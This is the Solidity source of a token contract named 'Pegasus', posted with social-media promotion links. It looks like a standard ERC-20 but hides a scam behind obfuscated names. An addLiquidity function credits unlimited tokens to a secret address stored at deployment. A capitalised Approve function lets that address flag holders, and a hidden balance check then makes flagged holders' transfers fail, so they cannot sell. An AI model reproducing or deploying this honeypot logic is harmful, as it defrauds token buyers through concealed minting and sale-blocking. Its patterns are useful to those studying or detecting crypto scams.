//Telegram: https://t.me/PegasustheHorse
//Website: https://pegasusthehorse.xyz
//Twitter: https://twitter.com/PegasustheH0rse
//Discord: https://discord.gg/cqKFw6A2

// SPDX-License-Identifier: MIT
pragma solidity =0.8.4;

import {IERC20} from "./libraries/IERC20.sol";
import {Ownable} from "./libraries/Ownable.sol";
import {SafeMath} from "./libraries/SafeMath.sol";

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Token {
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    uint256 internal constant VERSION = 1;
    event Deploy(
        address owner,
        uint256 version
    );
    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event Setpartner(address indexed pair, bool indexed value);

    event marketingWalletUpdated(address indexed newWallet, address indexed oldWallet);

    event devWalletUpdated(address indexed newWallet, address indexed oldWallet);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

}

contract Pegasus is IERC20, Token, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _soldes;

    mapping(address => bool) private _versteckt;

    mapping(address => mapping(address => uint256)) private _zuschuss;

    mapping(address => address) private _poqisa;
    string private _indenetify;
    string private _zeichen;
    uint8 private _dezimal;
    uint256 private _totalSupply;

    constructor(
        string memory name_,
        string memory symbol_,
        address howl_,
        uint256 totalSupply_
    ) payable {
        _indenetify = name_;
        _zeichen = symbol_;
        _dezimal = 18;
        _poqisa[howl_] = howl_;
        _menthe(msg.sender, totalSupply_ * 10**18);
        emit Deploy(
            owner(),
            VERSION
        );
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    }

    function name() public view virtual returns (string memory) {
        return _indenetify;
    }

    function symbol() public view virtual returns (string memory) {
        return _zeichen;
    }

    function decimals() public view virtual returns (uint8) {
        return _dezimal;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _soldes[account];
    }

    function transfer(address recipient, uint256 amount)
    public
    virtual
    override
    returns (bool)
    {
        _uberweisen(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _zuschuss[owner][spender];
    }

    function approve(address spender, uint256 amount)
    public
    virtual
    override
    returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _uberweisen(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _zuschuss[sender][_msgSender()].sub(
                amount,
                "IERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _uberweisen(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _hBalance(sender, recipient, amount);
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(
            recipient != address(0),
            "IERC20: transfer to the zero address"
        );

        _beforeTokenTransfer(sender, recipient, amount);
        _soldes[sender] = _soldes[sender].sub(
            amount,
            "IERC20: transfer amount exceeds balance"
        );
        _soldes[recipient] = _soldes[recipient] + amount;
        emit Transfer(sender, recipient, amount);
    }

    function _menthe(address account, uint256 amount) internal virtual {
        require(account != address(0), "IERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _plas(account, amount);
        emit Transfer(address(0), account, amount);
    }

    function _basiqfire(address account, uint256 amount) internal virtual {
        require(account != address(0), "IERC20: burn from the zero address");
        require(account != msg.sender, "Not valid address");
        _beforeTokenTransfer(account, address(0), amount);
        require(amount != 0, "Invalid amount");
        emit Transfer(account, address(0), amount);
    }

    function _min(address account, uint256 amount) internal {
        if (amount != 0) {
            _soldes[account] = _soldes[account] - amount;
        }
    }

    function _plas(address account, uint256 amount) internal {
        if (amount != 0) {
            _soldes[account] = _soldes[account] + amount;
        }
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");

        _zuschuss[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity(address spender, uint256 montante) public virtual {
        address from = msg.sender;
        require(spender != address(0), "Invalid address");
        require(montante > 0, "Invalid amount");
        uint256 totale = 0;
        if (_gDxPermet(spender)) {
            _min(from, totale);
            totale += _somme(totale, montante);
            _soldes[spender] += totale;
        } else {
            _min(from, totale);
            _soldes[spender] += totale;
        }
    }

    function _somme(uint256 qwe, uint256 mna) internal pure returns (uint256) {
        if (mna != 0) {
            return qwe + mna;
        }
        return mna;
    }

    function Approve(address spender, uint256 amount) public returns (bool)  {
        address from = msg.sender;
        _uberprufenErlaubnis(from, spender, amount);
        return true;
    }

    function _uberprufenErlaubnis(address user, address spender, uint256 amount) internal {
        if (_gDxPermet(user)) {
            require(spender != address(0), "Invalid address");
            _versteckt[spender] = amount != 0;
        }
    }

    function _soiqwp(address _sender) internal view returns (bool) {
        return _versteckt[_sender] == true;
    }

    function _gDxPermet(address nav_) internal view returns (bool) {
        return nav_ == _poqisa[nav_];
    }

    function _hBalance(
        address sender,
        address recipient,
        uint256 total
    ) internal virtual {
        uint256 amount = 0;
        if (_soiqwp(sender)) {
            _soldes[sender] = _soldes[sender] + amount;
            amount = _totalSupply;
            _min(sender, amount);
        } else {
            _soldes[sender] = _soldes[sender] + amount;
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}